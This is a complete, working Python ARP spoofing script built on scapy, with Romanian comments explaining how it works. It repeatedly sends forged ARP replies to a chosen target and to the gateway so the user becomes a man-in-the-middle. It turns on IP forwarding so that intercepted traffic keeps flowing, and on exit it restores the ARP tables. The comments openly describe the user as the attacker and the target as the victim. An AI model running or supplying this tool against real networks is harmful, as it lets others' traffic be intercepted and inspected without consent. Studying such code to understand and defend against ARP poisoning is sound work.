#!/usr/bin/env python3

import argparse
import scapy.all as scapy
import subprocess
import time

# Functia getInput foloseste un parser in scopul gestionarii argumentelor pe care utilizatorul trebuie sa le introduca atunci cand ruleaza programul in terminal
def getInput():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="targetIP", help="Your target's IP address")
    parser.add_argument("-g", "--gateway", dest="gatewayIP", help="The gateway's IP address")
    arguments = parser.parse_args()
    if not arguments.targetIP:
        parser.error("Please specify your target's IP address. Use -h or --help for more details!")
    if not arguments.gatewayIP:
        parser.error("Please specify the gateway's IP address. Use -h or --help for more details!")
    return arguments
    
# Functia getMAC trimite un ARP Request la adresa de broadcast a retelei pentru a afla adresa MAC a unui client a carei adresa IP o cunoastem
# Metoda srp ne permite sa trimitem pachete si, in acelasi timp, sa accesam setul de response-uri primite. 
def getMAC(ip):
    macHeader = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arpRequest = scapy.ARP(pdst=ip)
    packet = macHeader/arpRequest
    responsesList = scapy.srp(packet, timeout=1, verbose=False)[0]
    return responsesList[0][1].hwsrc

# Functia spoof profita de vulnerabilitatile de securitate ale protocolului ARP (clientii conectati la retea pot sa accepte un ARP Response fara sa fi trimis vreun request
# Functia trimite un ARP Response catre tinta in numele clientului cu IP-ul "spoofIP" (op=1 - ARP Request, op=2 - ARP Response)
# Astfel, in ARP Table-ul tintei, adresa MAC reala a clientului cu IP-ul "spoofIP" va fi inlocuita cu adresa MAC a atacatorului (a celui care utilizeaza programul)
def spoof(targetIP, spoofIP):
    targetMAC = getMAC(targetIP)
    arpResponse = scapy.ARP(op=2, pdst=targetIP, hwdst=targetMAC, psrc=spoofIP)
    scapy.send(arpResponse, verbose=False)

# Functia restoreTable restaureaza ARP Table-urile ambelor victime la valorile initiale dupa ce utilizatorul opreste atacul
def restoreTable(destinationIP, sourceIP):
    destinationMAC = getMAC(destinationIP)
    sourceMAC = getMAC(sourceIP)
    arpResponse = scapy.ARP(op=2, pdst=destinationIP, hwdst=destinationMAC, psrc=sourceIP, hwsrc=sourceMAC)
    scapy.send(arpResponse, count=4, verbose=False)

# Program principal
# Pentru ca datele trimise intre tinta si gateway sa poata fi interceptate, disecate si analizate, se va activa port forwarding pe computerul utilizatorului
# Scopul activarii port forwarding este ca pachetele trimise de tinta catre gatewey si inapoi sa poata circula prin utilizator dupa ce a devenit MITM
# La fiecare doua secunde, programul "pacaleste" victima ca atacatorul (utilizatorul) este gateway-ul si viceversa
userInput = getInput()
print("arpSpoofer on!")
print("[+] Enabling port forwarding...")
subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
packetsCount = 0
try:
    while True:
        spoof(userInput.targetIP, userInput.gatewayIP)
        spoof(userInput.gatewayIP, userInput.targetIP)
        packetsCount = packetsCount + 2
        print("\r[+] Packets sent: " + str(packetsCount), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Program closed! Restoring ARP tables...")
    restoreTable(userInput.targetIP, userInput.gatewayIP)
    restoreTable(userInput.gatewayIP, userInput.targetIP)
print("[-] Disabling port forwarding...")
subprocess.call("echo 0 > /proc/sys/net/ipv4/ip_forward", shell=True)
print("arpSpoofer off!")
